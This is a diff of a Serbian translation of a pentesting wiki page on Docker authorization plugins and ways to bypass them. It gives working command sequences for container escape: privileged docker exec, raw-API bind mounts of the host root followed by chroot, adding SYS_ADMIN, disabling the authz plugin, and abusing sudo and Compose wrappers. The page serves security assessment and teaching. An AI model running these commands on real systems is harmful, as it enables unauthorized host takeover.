@@ -1,128 +1,148 @@
-# Runtime Authorization Plugins
+# Dodaci za autorizaciju tokom izvršavanja
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Pregled
 
-Runtime authorization plugins su dodatni sloj policy-ja koji odlučuje da li caller sme da izvrši određenu daemon radnju. Docker je klasičan primer. Podrazumevano, svako ko može da komunicira sa Docker daemon-om praktično ima široku kontrolu nad njim. Authorization plugins pokušavaju da suze taj model ispitivanjem identiteta autentifikovanog korisnika i zahtevanе API operacije, a zatim dozvoljavaju ili odbijaju zahtev u skladu sa policy-jem.
+Dodaci za autorizaciju tokom izvršavanja predstavljaju dodatni sloj pravila koji odlučuje da li pozivalac sme da izvrši određenu radnju demona. Docker je klasičan primer. Podrazumevano, svako ko može da komunicira sa Docker demonom praktično ima široku kontrolu nad njim. Dodaci za autorizaciju pokušavaju da suze taj model tako što proveravaju identitet autentifikovanog korisnika i zatraženu API operaciju, a zatim dozvoljavaju ili odbijaju zahtev u skladu sa pravilima.
 
-Ova tema zaslužuje sopstvenu stranicu jer menja exploitation model kada attacker već ima pristup Docker API-ju ili korisniku u `docker` grupi. U takvim okruženjima pitanje više nije samo "da li mogu da pristupim daemon-u?", već i "da li je daemon zaštićen authorization slojem i, ako jeste, da li se taj sloj može zaobići preko neobrađenih endpoint-a, slabog JSON parsiranja ili permissions-a za upravljanje plugin-ima?"
+Ova tema zaslužuje zasebnu stranicu jer menja model eksploatacije kada napadač već ima pristup Docker API-ju ili korisniku u grupi `docker`. U takvim okruženjima pitanje više nije samo „mogu li da pristupim demonu?“ već i „da li je demon ograničen slojem za autorizaciju i, ako jeste, može li se taj sloj zaobići preko neobrađenih krajnjih tačaka, slabog JSON parsiranja ili dozvola za upravljanje dodacima?“
 
-## Operacija
+## Rad
 
-Kada zahtev stigne do Docker daemon-a, authorization subsystem može proslediti kontekst zahteva jednom ili više instaliranih plugin-a. Plugin vidi identitet autentifikovanog korisnika, detalje zahteva, odabrane headere i delove body-ja zahteva ili response-a kada je content type odgovarajući. Više plugin-a može biti ulančano, a pristup se odobrava samo ako svi plugin-i dozvole zahtev.
+Kada zahtev stigne do Docker demona, podsistem za autorizaciju može da prosledi kontekst zahteva jednom ili više instaliranih dodataka. Dodatak vidi identitet autentifikovanog korisnika, detalje zahteva, odabrana zaglavlja i delove tela zahteva ili odgovora kada je tip sadržaja odgovarajući. Više dodataka može da se poveže u lanac, a pristup se odobrava samo ako svi dodaci dozvole zahtev.
 
-Ovaj model deluje snažno, ali njegova bezbednost u potpunosti zavisi od toga koliko je autor policy-ja dobro razumeo API. Plugin koji blokira `docker run --privileged`, ali ignoriše `docker exec`, propušta alternativne JSON ključeve kao što je `Binds` na top-level-u ili dozvoljava administraciju plugin-a može stvoriti lažan osećaj ograničenja, a da i dalje ostavi otvorene direktne privilege-escalation putanje.
+Ovaj model zvuči robusno, ali njegova bezbednost u potpunosti zavisi od toga koliko je autor pravila temeljno razumeo API. Dodatak koji blokira `docker run --privileged`, ali ignoriše `docker exec`, propušta alternativne JSON ključeve kao što je `Binds` na najvišem nivou ili dozvoljava upravljanje dodacima, može stvoriti lažan osećaj ograničenja, a pritom ostaviti otvorene direktne puteve za eskalaciju privilegija.
 
-## Uobičajene mete plugin-a
+## Uobičajene mete dodataka
 
-Važne oblasti za policy review su:
+Važne oblasti za pregled pravila su:
 
-- endpoint-i za kreiranje container-a
-- polja u `HostConfig` kao što su `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` i opcije za deljenje namespace-a
-- ponašanje `docker exec` komande
-- endpoint-i za upravljanje plugin-ima
-- bilo koji endpoint koji može indirektno pokrenuti runtime radnje izvan predviđenog policy modela
+- krajnje tačke za kreiranje kontejnera
+- polja `HostConfig`, kao što su `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` i opcije za deljenje imenskih prostora
+- ponašanje komande `docker exec`
+- krajnje tačke za upravljanje dodacima
+- sve krajnje tačke koje mogu posredno da pokrenu radnje izvršavanja izvan predviđenog modela pravila
 
-Istorijski gledano, primeri kao što su Twistlock-ov `authz` plugin i jednostavni edukativni plugin-i kao što je `authobot` učinili su ovaj model lakim za proučavanje, jer su njihovi policy fajlovi i code path-ovi pokazivali kako je mapiranje endpoint-a na radnje zaista implementirano. Za assessment je važna lekcija da autor policy-ja mora da razume kompletnu API površinu, a ne samo najvidljivije CLI komande.
+Istorijski primeri, kao što je Twistlock-ov dodatak `authz` i jednostavni edukativni dodaci kao što je `authobot`, olakšali su proučavanje ovog modela jer su njihove datoteke sa pravilima i putanje kroz kod pokazivale kako je mapiranje krajnjih tačaka na radnje zaista implementirano. Za potrebe procene, važna pouka je da autor pravila mora da razume čitav API, a ne samo najvidljivije CLI komande.
 
-## Abuse
+## Zloupotreba
 
-Prvi cilj je saznati šta je zaista blokirano. Ako daemon odbije neku radnju, greška često leak-uje ime plugin-a, što pomaže u identifikaciji korišćene kontrole:
+Prvi cilj je da se utvrdi šta je zaista blokirano. Ako demon odbije radnju, greška često otkriva naziv dodatka, što pomaže u prepoznavanju korišćene kontrole:
+
 ```bash
 docker ps
 docker run --rm -it --privileged ubuntu:24.04 bash
 docker plugin ls
 ```
-Ako vam je potrebno šire profilisanje endpointa, alati kao što je `docker_auth_profiler` korisni su jer automatizuju inače repetitivan zadatak provere koje API rute i JSON strukture plugin zaista dozvoljava.
 
-Ako okruženje koristi prilagođeni plugin i možete da komunicirate sa API-jem, navedite koja polja objekata se zaista filtriraju:
+Ako vam je potrebno šire profilisanje krajnjih tačaka, korisni su alati kao što je `docker_auth_profiler`, jer automatizuju inače repetitivan zadatak provere toga koje API rute i JSON strukture plugin zaista dozvoljava.
+
+Ako okruženje koristi prilagođeni plugin i možete da komunicirate sa API-jem, popišite koja polja objekta se zaista filtriraju:
+
 ```bash
 docker version
 docker inspect <container> 2>/dev/null | head
 curl --unix-socket /var/run/docker.sock http:/version
 curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
 ```
-Ove provere su važne zato što su mnogi neuspesi autorizacije specifični za polje, a ne za koncept. Plugin može odbiti CLI obrazac, a da pritom u potpunosti ne blokira ekvivalentnu API strukturu.
 
-### Potpuni primer: `docker exec` dodaje privilegije nakon kreiranja kontejnera
+Ove provere su važne jer se mnogi propusti u autorizaciji odnose na određena polja, a ne na koncepte. Dodatak može da odbije CLI obrazac, a da pritom ne blokira u potpunosti ekvivalentnu API strukturu.
 
-Politika koja blokira kreiranje privileged kontejnera, ali dozvoljava kreiranje unconfined kontejnera uz `docker exec`, i dalje može biti zaobiđena:
+### Potpun primer: `docker exec` dodaje privilegije nakon kreiranja kontejnera
+
+Pravila koja blokiraju kreiranje privilegovanih kontejnera, ali dozvoljavaju kreiranje neograničenih kontejnera uz `docker exec`, ipak mogu biti zaobiđena:
+
 ```bash
 docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
 docker ps
 docker exec -it --privileged <container_id> bash
 ```
-Ako daemon prihvati drugi korak, korisnik je povratio privilegovani interaktivni proces unutar containera za koji je autor policy-ja verovao da je ograničen.
 
-### Full Example: Bind Mount Through Raw API
+Ako daemon prihvati drugi korak, korisnik je povratio privilegovani interaktivni proces unutar kontejnera za koji je autor pravila verovao da je ograničen.
 
-Neke neispravne policy-je proveravaju samo jedan JSON oblik. Ako bind mount root filesystema nije dosledno blokiran, host se i dalje može mountovati:
+Ograničeno `sudo` pravilo može da otvori isti put čak i kada pozivalac ne može direktno da pristupi Docker socket-u. Na primer, dozvola za `/usr/bin/docker exec *` sa root privilegijama može pozivaocu omogućiti da prosledi Docker opcije `--privileged` i `--user root`. Potreban je pokrenut kontejner; na nekim Linux hostovima njegov ID se vidi u komandnoj liniji procesa `containerd-shim` kada je komanda `docker ps` zabranjena. Posmatrajte ovo pravilo kao trag za proveru: potvrdite efektivnu sudo politiku, kontrole autorizacije daemon-a, user namespaces i da li rezultujući proces može da pristupi host uređaju ili host mount-u sa dozvolom za pisanje. Docker opisuje exec opcije u svojoj [CLI referenci](https://docs.docker.com/reference/cli/docker/container/exec/).
+
+Wrapper koji se pokreće kao root i prihvata Compose fajl koji bira pozivalac mora da proveri ceo [Compose service model](https://docs.docker.com/reference/compose-file/services/), a ne samo da odbije `privileged: true` i zahteva `:ro` za bind mount-ove. Proverite `cap_add`, `security_opt`, uređaje, namespaces, ulazne podatke za build i sve podržane sintakse za volume. Bind mount samo za čitanje i dalje može postati zapisiv iz kontejnera sa odgovarajućim capabilities i blažim bezbednosnim ograničenjima, u zavisnosti od politike daemon-a i kernela. Potrebno je proveriti i allowlist-e host putanja zasnovane samo na prefiksu i provere symlink-ova samo na završnoj komponenti putanje. Sudo pravilo i doslovni poziv `docker-compose up` ukazuju na mogući slučaj; mogućnost eksploatacije zavisi od efektivne validacije wrapper-a i ograničenja daemon-a tokom izvršavanja.
+
+### Potpun primer: Bind mount preko Raw API-ja
+
+Neke neispravne politike proveravaju samo jedan JSON oblik. Ako bind mount korenskog fajl sistema nije dosledno blokiran, host i dalje može da se montira:
+
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock \
--H "Content-Type: application/json" \
--d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
-http:/v1.41/containers/create
+  -H "Content-Type: application/json" \
+  -d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
+  http:/v1.41/containers/create
 docker start <container_id>
 docker exec -it <container_id> chroot /host /bin/bash
 ```
-Ista ideja se može pojaviti i u okviru `HostConfig`:
+
+Ista ideja može se pojaviti i pod `HostConfig`:
+
 ```bash
 curl --unix-socket /var/run/docker.sock \
--H "Content-Type: application/json" \
--d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
-http:/v1.41/containers/create
+  -H "Content-Type: application/json" \
+  -d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
+  http:/v1.41/containers/create
 ```
-Uticaj je potpuno bekstvo iz host filesystem-a. Zanimljiv detalj je to što bypass potiče od nepotpune pokrivenosti policy-ja, a ne od greške u kernelu.
 
-### Potpun primer: Neprovereni capability atribut
+Uticaj je potpuno bekstvo iz fajl-sistema hosta. Zanimljivo je da do zaobilaženja dolazi zbog nepotpune pokrivenosti pravilima, a ne zbog greške u kernelu.
 
-Ako policy zaboravi da filtrira atribut povezan sa capability-jima, attacker može da kreira container koji ponovo dobija opasan capability:
+### Potpun primer: neprovereni atribut capability
+
+Ako pravilo zaboravi da filtrira atribut povezan sa capability-jem, napadač može da kreira kontejner koji ponovo dobija opasnu capability:
+
 ```bash
 curl --unix-socket /var/run/docker.sock \
--H "Content-Type: application/json" \
--d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
-http:/v1.41/containers/create
+  -H "Content-Type: application/json" \
+  -d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
+  http:/v1.41/containers/create
 docker start <container_id>
 docker exec -it <container_id> bash
 capsh --print
 ```
-Kada je prisutan `CAP_SYS_ADMIN` ili slična moćna capability, mnoge breakout tehnike opisane u [capabilities.md](protections/capabilities.md) i [privileged-containers.md](privileged-containers.md) postaju dostupne.
 
-### Potpun primer: Onemogućavanje plugina
+Kada je prisutan `CAP_SYS_ADMIN` ili neka slično moćna capability, postaju dostupne mnoge breakout tehnike opisane u [capabilities.md](protections/capabilities.md) i [privileged-containers.md](privileged-containers.md).
 
-Ako su operacije upravljanja pluginima dozvoljene, najčistiji bypass može biti potpuno isključivanje kontrole:
+### Potpuni primer: Isključivanje dodatka
+
+Ako su dozvoljene operacije upravljanja dodacima, najčistiji način za zaobilaženje kontrole može biti da je potpuno isključite:
+
 ```bash
 docker plugin ls
 docker plugin disable <plugin_name>
 docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
 docker plugin enable <plugin_name>
 ```
-Ovo je greška u politici na nivou control-plane-a. Sloj authorization postoji, ali korisnik čija je aktivnost trebalo da bude ograničena i dalje ima dozvolu da ga onemogući.
+
+Ovo je propust u pravilima na nivou kontrolne ravni. Sloj autorizacije postoji, ali korisnik kog je trebalo da ograniči i dalje ima dozvolu da ga onemogući.
 
 ## Provere
 
-Ove komande služe za utvrđivanje toga da li sloj politike postoji i da li deluje potpun ili površan.
+Ove komande služe da utvrde da li sloj pravila postoji i da li deluje potpun ili površan.
+
 ```bash
 docker plugin ls
 docker info 2>/dev/null | grep -i authorization
 docker run --rm -it --privileged ubuntu:24.04 bash
 curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
 ```
+
 Šta je ovde zanimljivo:
 
-- Poruke o zabrani koje sadrže naziv plugin-a potvrđuju postojanje authorization sloja i često otkrivaju tačnu implementaciju.
-- Lista plugin-a vidljiva napadaču može biti dovoljna da otkrije da li su operacije disable ili reconfigure moguće.
-- Policy koja blokira samo očigledne CLI akcije, ali ne i raw API zahteve, treba smatrati zaobiđivom dok se ne dokaže suprotno.
+- Poruke o odbijanju koje sadrže naziv plugin-a potvrđuju postojanje authorization sloja i često otkrivaju tačnu implementaciju.
+- Lista plugin-a vidljiva napadaču može biti dovoljna da otkrije da li su operacije onemogućavanja ili ponovnog konfigurisanja moguće.
+- Politiku koja blokira samo očigledne CLI radnje, ali ne i direktne API zahteve, treba smatrati zaobilazivom dok se ne dokaže suprotno.
 
-## Podrazumevane vrednosti runtime-a
+## Podrazumevane vrednosti runtime okruženja
 
 | Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
 | --- | --- | --- | --- |
-| Docker Engine | Nije podrazumevano omogućen | Pristup daemon-u je praktično all-or-nothing, osim ako nije konfigurisan authorization plugin | nepotpuna plugin policy, blacklists umesto allowlists, omogućavanje upravljanja plugin-ima, slepe tačke na nivou polja |
-| Podman | Nema uobičajeni direktni ekvivalent | Podman se obično više oslanja na Unix permissions, rootless izvršavanje i odluke o izlaganju API-ja nego na Docker-style authz plugin-e | široko izlaganje rootful Podman API-ja, slabe permissions socket-a |
-| containerd / CRI-O | Drugačiji control model | Ovi runtime-i se obično oslanjaju na permissions socket-a, granice poverenja na node-u i kontrole orchestrator-a na višem nivou, a ne na Docker authz plugin-e | mountovanje socket-a u workload-e, slabe lokalne pretpostavke o poverenju u node |
-| Kubernetes | Koristi authn/authz na nivoima API server-a i kubelet-a, a ne Docker authz plugin-e | Cluster RBAC i admission controls su glavni policy sloj | preširok RBAC, slaba admission policy, direktno izlaganje kubelet ili runtime API-ja |
+| Docker Engine | Nije podrazumevano omogućen | Pristup daemon-u je praktično sve-ili-ništa, osim ako nije konfigurisan authorization plugin | nepotpuna politika za plugin, crne liste umesto belih lista, dozvoljeno upravljanje plugin-ima, slepe tačke na nivou polja |
+| Podman | Nema uobičajenog direktnog ekvivalenta | Podman se obično više oslanja na Unix dozvole, rootless izvršavanje i odluke o izlaganju API-ja nego na Docker-style authz plugin-e | široko izlaganje rootful Podman API-ja, slabe dozvole za socket |
+| containerd / CRI-O | Drugačiji model kontrole | Ovi runtime-i se obično oslanjaju na dozvole za socket, granice poverenja čvorova i kontrole orkestratora na višem nivou, a ne na Docker authz plugin-e | montiranje socket-a u workload-e, slabe pretpostavke o lokalnom poverenju čvora |
+| Kubernetes | Koristi authn/authz na slojevima API server-a i kubelet-a, a ne Docker authz plugin-e | Cluster RBAC i admission kontrole predstavljaju glavni sloj politike | preširok RBAC, slaba admission politika, direktno izlaganje kubelet ili runtime API-ja |
 
 {{#include ../../../banners/hacktricks-training.md}}
